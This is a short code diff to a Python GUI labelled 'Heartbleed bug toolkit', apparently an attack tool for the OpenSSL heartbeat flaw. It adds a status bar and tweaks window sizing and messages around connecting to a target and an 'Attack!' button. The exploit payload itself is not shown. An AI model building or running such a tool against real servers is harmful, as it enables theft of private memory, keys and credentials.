@@ -21,7 +21,7 @@ from optparse import OptionParser
 
 window = Tk()
 window.title("Heartbleed bug toolkit")
-window.configure(width = 600, height = 400)
+window.geometry("600x400")
 
 class colors:
     HEADER = '\033[95m'
@@ -174,7 +174,8 @@ def maingui():
     TIMES = TIMES_text.get()
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print 'Connecting...'
+    print ' Connecting...'
+    status.set('Connecting...')
     sys.stdout.flush()
     s.connect((IP, PORT))
     print 'Sending Client Hello...'
@@ -223,5 +224,10 @@ e3.grid(row = 2, column = 1)
 
 b1 = Button(window, text = "Attack!", command = maingui)
 b1.grid(row = 4, column = 1)
+
+status = StringVar()
+status.set("Press Start button to start the attack.")
+statusbar = Label(window, textvariable = status , bd = 1, relief = SUNKEN, anchor = W)
+statusbar.grid(row = 5, column = 0, columnspan = 5)
 
 window.mainloop()
